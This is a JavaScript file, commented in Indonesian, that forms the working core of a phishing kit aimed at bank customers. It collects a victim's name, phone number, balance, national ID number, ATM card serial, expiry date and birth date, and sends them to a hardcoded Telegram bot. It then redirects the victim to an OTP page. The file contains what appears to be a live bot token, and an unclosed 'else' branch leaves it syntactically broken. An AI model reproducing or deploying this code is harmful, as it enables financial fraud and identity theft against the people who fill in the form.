// Versi JS untuk menggantikan logika PHP
// Catatan: Untuk keamanan, jangan hardcode token dan ID Telegram di client-side.
// Gunakan server-side (PHP) untuk kirim ke Telegram.
// Ini hanya demo; gunakan dengan hati-hati.

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('form1');
    const loader = document.getElementById('loader');

    // Ganti dengan token dan ID Telegram kamu (jangan hardcode di production)
    const token_bot = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token bot Telegram
    const telegram_id = '7213790655'; // Ganti dengan ID chat Telegram

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Ambil data dari form
        const nama = document.getElementById('nama').value;
        const nomor = document.getElementById('nomor').value;
        const saldo = document.getElementById('saldo').value;
        const nik = document.getElementById('nik').value;
        const seri = document.getElementById('seri').value;
        const masa = document.getElementById('masa').value;
        const tanggal_lahir = document.getElementById('tanggal_lahir').value;

        // Simpan ke sessionStorage (sebagai pengganti session PHP)
        sessionStorage.setItem('nama', nama);
        sessionStorage.setItem('nomor', nomor);
        sessionStorage.setItem('saldo', saldo);
        sessionStorage.setItem('nik', nik);
        sessionStorage.setItem('seri', seri);
        sessionStorage.setItem('masa', masa);
        sessionStorage.setItem('tanggal_lahir', tanggal_lahir);

        // Buat pesan
        const message = `
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : ${nama}
├• *Nomor* : ${nomor}
├• *Saldo* : ${saldo}
├• *Nik Ktp* : ${nik}
├• *Seri Kartu ATM* : ${seri}
├• *Masa Berlaku* : ${masa}
├• *Tanggal Lahir* : ${tanggal_lahir}
╰───────────────────
        `;

        // Tampilkan loader
        loader.style.display = 'flex';

        // Kirim ke Telegram API menggunakan fetch
        const url = `https://api.telegram.org/bot${token_bot}/sendMessage?parse_mode=markdown&chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Sukses, redirect ke halaman PIN
                    setTimeout(() => {
                        loader.style.display = 'none';
                        window.location.href = 'otp.html';
                    }, 500);
                } else {
            })
            .catch(error => {
                console.error('Fetch error:', error);
                loader.style.display = 'none';
                alert('Error: ' + error.message);
            });
    });
});
